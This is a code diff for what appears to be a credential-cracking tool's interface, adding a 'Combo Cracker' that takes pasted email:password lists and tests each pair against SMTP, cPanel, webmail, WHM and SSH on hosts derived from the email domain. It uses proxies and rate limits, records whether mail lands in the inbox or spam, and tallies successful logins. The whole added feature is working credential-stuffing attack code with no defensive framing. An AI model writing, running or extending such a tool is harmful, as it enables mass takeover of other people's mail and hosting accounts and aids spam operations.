@@ -957,6 +957,108 @@ $('#btn-ssh-check').addEventListener('click', async () => {
   }
 });
 
+// ---------- Combo Cracker (all 5 protocols from one paste) ----------
+function comboDeriveHost(rec) {
+  if (rec.host) return rec.host;
+  const u = String(rec.user || '');
+  return u.includes('@') ? u.split('@')[1] : null;
+}
+
+function comboCell(kind, result) {
+  if (!result) return '<td class="detail"><span class="dbadge b-neutral">—</span></td>';
+  let cls = 'b-neutral';
+  let label = '?';
+  if (kind === 'smtp') {
+    if (result.status === 'valid') { cls = 'b-ok'; label = '✓'; }
+    else if (result.status === 'inbox') { cls = 'b-ok'; label = '✓ inbox'; }
+    else if (result.status === 'spam') { cls = 'b-ok'; label = '✓ spam'; }
+    else if (result.status === 'dead') { cls = 'b-bad'; label = '✗'; }
+    else { label = result.status || '?'; }
+  } else {
+    if (result.valid === true) { cls = 'b-ok'; label = '✓'; }
+    else if (result.reachable === false) { cls = 'b-neutral'; label = '—'; }
+    else if (result.valid === false) { cls = 'b-bad'; label = '✗'; }
+    else { label = '?'; }
+  }
+  return '<td class="detail"><span class="dbadge ' + cls + '">' + label + '</span></td>';
+}
+
+function comboRenderRow(r) {
+  const notes = [];
+  if (r.smtp?.proxyFallback) notes.push('dead proxy — retried direct');
+  if (r.smtp?.usedHost) notes.push('smtp: ' + r.smtp.usedHost);
+  return '<tr>' +
+    '<td class="mono">' + esc(r.user) + '</td>' +
+    comboCell('smtp', r.smtp) +
+    comboCell('cpanel', r.cpanel) +
+    comboCell('webmail', r.webmail) +
+    comboCell('whm', r.whm) +
+    comboCell('ssh', r.ssh) +
+    '<td class="notes">' + esc(notes.join('; ')) + '</td>' +
+    '</tr>';
+}
+
+$('#btn-combo-crack').addEventListener('click', async () => {
+  const out = $('#combo-results-body');
+  const prog = $('#combo-progress');
+  const statusEl = $('#combo-status');
+  const btn = $('#btn-combo-crack');
+  const parsed = parse($('#combo-input').value);
+  if (!parsed.records.length) {
+    out.innerHTML = '<tr><td colspan="7" class="empty-row">Paste at least one email:password line.</td></tr>';
+    statusEl.textContent = parsed.errors.length ? parsed.errors.length + ' line(s) skipped' : '';
+    return;
+  }
+  const maxPerSec = Math.max(0, Number($('#opt-maxrate').value) || 0);
+  const intervalMs = maxPerSec > 0 ? Math.floor(1000 / maxPerSec) : 0;
+  btn.disabled = true;
+  out.innerHTML = '';
+  prog.textContent = '0 / ' + parsed.records.length;
+  statusEl.textContent = '';
+  const rows = [];
+  let done = 0;
+  try {
+    for (const rec of parsed.records) {
+      if (intervalMs) await new Promise((res) => setTimeout(res, intervalMs));
+      const host = comboDeriveHost(rec);
+      const panelTarget = { host, user: rec.user, pass: rec.pass };
+      const smtpCred = { user: rec.user, pass: rec.pass, host: rec.host || null, port: rec.port || 587 };
+      const promises = [
+        api.checkSmtp([smtpCred], { concurrency: 1, maxPerSec, proxyConfig: settings?.proxy }).catch((e) => ({ error: e.message })),
+        host ? api.checkCpanel([panelTarget], { port: 2083, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
+        host ? api.checkWebmail([panelTarget], { port: 443, path: '/webmail', concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
+        host ? api.checkWhm([panelTarget], { port: 2087, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
+        host ? api.checkSsh([panelTarget], { port: 22, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
+      ];
+      const [smtp, cp, wm, whm, ssh] = await Promise.allSettled(promises);
+      const row = {
+        user: rec.user,
+        host,
+        smtp: smtp.status === 'fulfilled' ? (smtp.value.results?.[0] || null) : null,
+        cpanel: cp.status === 'fulfilled' ? (cp.value.results?.[0] || null) : null,
+        webmail: wm.status === 'fulfilled' ? (wm.value.results?.[0] || null) : null,
+        whm: whm.status === 'fulfilled' ? (whm.value.results?.[0] || null) : null,
+        ssh: ssh.status === 'fulfilled' ? (ssh.value.results?.[0] || null) : null,
+      };
+      rows.push(row);
+      done++;
+      prog.textContent = done + ' / ' + parsed.records.length;
+      out.innerHTML = rows.map(comboRenderRow).join('');
+    }
+    const hits = rows.filter((r) =>
+      r.cpanel?.valid || r.webmail?.valid || r.whm?.valid || r.ssh?.valid ||
+      (r.smtp && (r.smtp.status === 'valid' || r.smtp.status === 'inbox' || r.smtp.status === 'spam'))
+    );
+    statusEl.textContent = hits.length
+      ? hits.length + ' combo(s) had at least one successful protocol.'
+      : 'No successful protocol hits in this batch.';
+  } catch (err) {
+    statusEl.textContent = 'Combo crack failed: ' + err.message;
+  } finally {
+    btn.disabled = false;
+  }
+});
+
 // ---------- Email authentication check ----------
 function authBadge(label, verdict) {
   // verdict: 'ok' | 'bad' | 'neutral'
